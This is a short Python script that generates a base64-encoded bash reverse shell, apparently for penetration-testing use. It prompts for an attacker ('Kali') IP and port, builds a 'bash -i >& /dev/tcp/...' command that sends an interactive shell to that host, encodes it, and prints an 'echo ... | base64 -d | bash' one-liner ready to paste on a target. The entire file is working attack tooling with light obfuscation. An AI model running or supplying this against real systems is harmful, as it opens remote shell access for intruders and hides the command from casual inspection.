#!/usr/bin/python3
import base64

def generate_reverse_shell():
    kali_ip = input("Enter Kali IP: ")
    port = input("Enter Port number: ")
    
    # Create the reverse shell command
    cmd = f"bash -i >& /dev/tcp/{kali_ip}/{port} 0>&1"
    
    # Encode to base64
    encoded = base64.b64encode(cmd.encode()).decode()
    
    print("\nBase64 encoded command:")
    print(encoded)
    print("\nFull command to use:")
    print(f'echo "{encoded}" | base64 -d | bash')

if __name__ == "__main__":
    generate_reverse_shell()
    